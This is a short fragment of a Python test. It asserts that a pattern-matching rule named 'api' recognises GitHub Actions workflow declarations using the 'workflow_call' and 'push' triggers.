    api = YAML_RULES["api"]

    # Declarations that publish a name -- must match.
    assert api.search('on:\n  workflow_call:\n'), 'reusable-workflow trigger'
    assert api.search('on:\n  push:\n'), 'push trigger (kept)'

